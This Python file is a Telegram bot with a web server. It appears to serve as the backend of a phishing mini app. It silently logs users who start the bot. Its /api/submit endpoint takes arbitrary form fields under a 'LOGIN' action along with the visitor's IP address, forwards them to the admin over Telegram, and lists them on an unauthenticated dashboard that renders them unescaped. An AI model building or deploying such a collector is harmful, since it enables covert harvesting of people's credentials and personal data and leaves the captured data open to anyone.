import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
PORT = int(os.getenv("PORT", 10000))

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

LIFETIME_USER_LOGS = []

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user = message.from_user
    render_url = os.getenv("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{PORT}")
    
    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url=render_url)
    keyboard.add(InlineKeyboardButton(text="🚀 Open Portal / Mini App", web_app=web_app))
    
    await message.reply("Welcome! Click below to open the application:", reply_markup=keyboard, parse_mode="Markdown")
    
    if user.id != ADMIN_ID:
        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = {
            "sr": sr_no, "category": "BOT START EVENT", "status": "Bot Opened",
            "name": user.full_name, "username": f"@{user.username}" if user.username else "N/A",
            "id": str(user.id),
            "fields": {
                "Full Name": user.full_name, "Telegram Username": f"@{user.username}" if user.username else "N/A",
                "Telegram ID": str(user.id), "Language Code": user.language_code or "en",
                "Telegram Premium": "Yes" if getattr(user, "is_premium", False) else "No", "Platform": "Telegram Client App"
            },
            "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
        }
        LIFETIME_USER_LOGS.insert(0, entry)

@dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    render_url = os.getenv("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{PORT}")
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton(text="📊 Open Live Admin Web Panel", web_app=WebAppInfo(url=f"{render_url}/admin/dashboard")))
    await message.reply("🛠 **Admin Panel Ready:**", reply_markup=keyboard, parse_mode="Markdown")

async def handle_website(request):
    try:
        with open("index.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        return web.Response(text=html_content, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"Error loading UI: {str(e)}", status=500)

async def handle_api_submit(request):
    try:
        data = await request.json()
        user_id = str(data.get("telegram_id", "Unknown"))
        username = data.get("username", "N/A")
        name = data.get("name", "Unknown User")
        action_type = data.get("action", "LOGIN").upper()
        status = data.get("status", "Successful")
        form_fields = data.get("form_fields", {})
        extra_info = data.get("extra_info", {})
        ip_address = request.headers.get("X-Forwarded-For", request.remote or "127.0.0.1")

        sr_no = len(LIFETIME_USER_LOGS) + 1
        fields_dict = {
            "Action Status": status, "Telegram Name": name,
            "Telegram Username": f"@{username}" if not username.startswith("@") else username,
            "Telegram ID": user_id,
            "Network IP Address": ip_address
        }
        for k, v in form_fields.items():
            fields_dict[k] = v
        for k, v in extra_info.items():
            fields_dict[k] = v

        entry = {
            "sr": sr_no, "category": f"MINI APP {action_type}", "status": status,
            "name": name, "username": f"@{username}" if not username.startswith("@") else username,
            "id": user_id, "fields": fields_dict,
            "time": os.popen('date').read().strip() or "Just Now"
        }
        LIFETIME_USER_LOGS.insert(0, entry)

        # Telegram Instant Alert
        alert_text = f"🔥 **Mini App {action_type} ({status})**\n- Name: {name}\n- ID: `{user_id}`\n- IP: `{ip_address}`\n"
        for k, v in form_fields.items():
            alert_text += f"- **{k}**: `{v}`\n"
        await bot.send_message(ADMIN_ID, alert_text, parse_mode="Markdown")

        return web.json_response({"status": "success"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)}, status=400)

async def handle_admin_dashboard(request):
    logs_html = ""
    if LIFETIME_USER_LOGS:
        for log in LIFETIME_USER_LOGS:
            fields_html = ""
            for key, val in log['fields'].items():
                fields_html += f'<div class="field-row"><span class="field-key">🔹 {key}:</span><span class="field-val">{val}</span></div>'
            logs_html += f"""
            <div class="log-card" style="background:#1e293b; border-radius:10px; padding:12px; margin-bottom:12px; border:1px solid #334155;">
                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding-bottom:8px; margin-bottom:8px; font-size:11px;">
                    <span style="background:#38bdf8; color:#0f172a; font-weight:bold; padding:2px 6px; border-radius:4px;">#{log['sr']}</span>
                    <span style="color:#4ade80; font-weight:bold;">{log['category']}</span>
                    <span style="color:#94a3b8;">{log['time']}</span>
                </div>
                <div>{fields_html}</div>
            </div>"""
    else:
        logs_html = "<div style='text-align:center; color:#94a3b8; margin-top:50px;'>No logs captured yet...</div>"

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ZAROPLAY Lifetime Admin Panel</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; padding: 12px; }}
            .field-row {{ display: flex; justify-content: space-between; padding: 4px 0; border-bottom: 1px dashed rgba(51, 65, 85, 0.5); font-size: 12px; }}
            .field-key {{ color: #93c5fd; width: 45%; }}
            .field-val {{ color: #facc15; font-weight: bold; width: 55%; word-break: break-all; text-align: right; }}
        </style>
    </head>
    <body>
        <div style="text-align:center; border-bottom:2px solid #334155; padding-bottom:10px; margin-bottom:15px;">
            <h1 style="font-size:17px; color:#38bdf8; margin:5px 0;">🛡️ ZAROPLAY LIFETIME ADMIN PANEL</h1>
            <p style="font-size:11px; color:#94a3b8; margin:0;">Owner: Umang Lal Meena</p>
        </div>
        <div style="background:#1e293b; padding:10px 14px; border-radius:8px; font-size:13px; margin-bottom:15px; border:1px solid #334155;">
            📊 <strong>Total Saved Records:</strong> {len(LIFETIME_USER_LOGS)}
        </div>
        {logs_html}
        <script>window.Telegram.WebApp.expand();</script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')

app = web.Application()
app.router.add_get('/', handle_website)
app.router.add_post('/api/submit', handle_api_submit)
app.router.add_get('/admin/dashboard', handle_admin_dashboard)

async def on_startup(dispatcher):
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
            
